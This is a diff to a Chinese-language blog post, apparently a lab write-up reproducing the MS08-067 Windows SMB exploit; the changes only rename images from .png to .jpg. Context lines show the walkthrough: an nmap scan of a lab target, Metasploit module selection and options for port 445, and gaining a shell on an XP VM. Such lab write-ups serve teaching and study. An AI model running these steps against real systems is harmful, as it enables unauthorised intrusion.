@@ -2,7 +2,7 @@
 title: 【漏洞】windows漏洞MS08-067复现与攻击
 date: 2024-11-20
 slug: ms08-067review-atk
-image: done.png
+image: done.jpg
 tag: 
     - CTF
     - 网络安全
@@ -41,7 +41,7 @@ SHA1: 69DBF131116760932DCF132ADE111D6B45778098
 ipconfig
 ````
 
-![ipconfig](ipconfig.png)
+![ipconfig](ipconfig.jpg)
 
 可知靶机ip为：`192.168.15.129`
 
@@ -51,7 +51,7 @@ ipconfig
 ifconfig
 ````
 
-![ifconfig](ifconfig.png)
+![ifconfig](ifconfig.jpg)
 
 可知攻击机ip为：`192.168.15.128`
 
@@ -73,7 +73,7 @@ nmap -sV -Pn 192.168.15.129
 
 扫描得到：
 
-![nmap](nmap.png)
+![nmap](nmap.jpg)
 
 可以看到靶机开放了三个端口，其中就有我们今天要利用的`445`端口。
 
@@ -89,7 +89,7 @@ msfconsole
 msf6> search ms08-067
 ````
 
-![msf-search](msf.png)
+![msf-search](msf.jpg)
 
 可以看到它找到了一个结果，来使用它：
 
@@ -125,7 +125,7 @@ msf6> set TARGET 'Windows XP SP3 Chinese - Simplified(NX)'
 
 不建议复制我的，因为不同环境它的序号和名字也会变，比如我的简中XP序号是35，朋友的是10。
 
-![different](different.png)
+![different](different.jpg)
 
 如果设定了错误的`target`并且已经执行了的话，需要重启靶机，不然会无法连接到靶机的445端口。
 
@@ -135,7 +135,7 @@ msf6> set TARGET 'Windows XP SP3 Chinese - Simplified(NX)'
 msf6> show options
 ````
 
-![options](msf-show-options.png)
+![options](msf-show-options.jpg)
 
 配置`RHOSTS`、`RPORT`:
 
@@ -154,7 +154,7 @@ msf6> set RPORT 445
 msf6> exploit(windows/smb/ms08_067_netapi) > run
 ````
 
-![set](gatch.png)
+![set](gatch.jpg)
 
 成功拿到shell!
 
@@ -168,7 +168,7 @@ edit hacknya.txt
 sysinfo
 ````
 
-![test](done.png)
+![test](done.jpg)
 
 完美！
 
